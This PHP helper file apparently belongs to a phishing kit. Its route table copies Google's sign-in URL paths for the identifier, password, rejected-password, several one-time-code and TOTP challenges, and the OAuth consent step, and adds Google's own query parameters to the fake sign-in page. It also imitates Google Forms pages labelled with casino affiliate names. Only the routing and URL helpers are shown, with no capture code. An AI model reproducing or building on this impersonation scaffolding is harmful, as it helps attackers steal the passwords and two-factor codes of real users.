<?php

function abs_path(string $path): string
{
    $path = '/' . ltrim(str_replace('\\', '/', $path), '/');
    return preg_replace('#/+#', '/', $path);
}

function site_root(): string
{
    static $root = null;
    if ($root !== null) {
        return $root;
    }

    if (defined('SITE_BASE_PATH') && SITE_BASE_PATH !== '') {
        $root = rtrim(str_replace('\\', '/', SITE_BASE_PATH), '/');
        return $root;
    }

    $root = '';
    return $root;
}

function site_url(string $path = ''): string
{
    $root = site_root();
    if ($root !== '') {
        return abs_path($root . '/' . ltrim($path, '/'));
    }

    $dir = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? ''));
    $dir = rtrim($dir, '/');

    if ($dir === '' || $dir === '.') {
        return abs_path($path);
    }

    return abs_path($dir . '/' . ltrim($path, '/'));
}

function site_url_esc(string $path = ''): string
{
    return htmlspecialchars(site_url($path), ENT_QUOTES, 'UTF-8');
}

function page_routes(): array
{
    return [
        'signin'   => 'v3/signin/identifier',
        'pass'     => 'v3/signin/challenge/pwd',
        'wrong'    => 'v3/signin/challenge/pwd/rejected',
        'otp1'     => 'v3/signin/challenge/ipp',
        'otp2'     => 'v3/signin/challenge/ipe',
        'otp3'     => 'v3/signin/challenge/totp',
        'yahoo'    => 'v3/signin/challenge/dp',
        'loading'  => 'v3/signin/loading',
        'finish'   => 'signin/oauth/consent',
        'viewform' => 'forms/d/e/1FAIpQLSfnRoobet-affiliate/viewform',
        'viewforms'=> 'forms/d/e/1FAIpQLSfnDuel-affiliate/viewform',
    ];
}

function page_route(string $page): string
{
    $page = preg_replace('/\.php$/', '', trim($page, '/'));
    $routes = page_routes();

    return $routes[$page] ?? $page;
}

function page_url(string $page = ''): string
{
    $page = preg_replace('/\.php$/', '', trim($page, '/'));
    if ($page === '' || $page === 'index') {
        return site_url('');
    }

    $url = site_url(page_route($page));

    if ($page === 'signin') {
        $url .= (strpos($url, '?') === false ? '?' : '&')
            . 'flowEntry=ServiceLogin&flowName=GlifWebSignIn';
    }

    return $url;
}

function page_url_esc(string $page = ''): string
{
    return htmlspecialchars(page_url($page), ENT_QUOTES, 'UTF-8');
}

function versioned_url(string $path): string
{
    $file = dirname(__DIR__, 2) . '/' . ltrim(str_replace('\\', '/', $path), '/');
    $url = site_url($path);

    if (is_file($file)) {
        return $url . '?v=' . filemtime($file);
    }

    return $url;
}

function versioned_url_esc(string $path): string
{
    return htmlspecialchars(versioned_url($path), ENT_QUOTES, 'UTF-8');
}
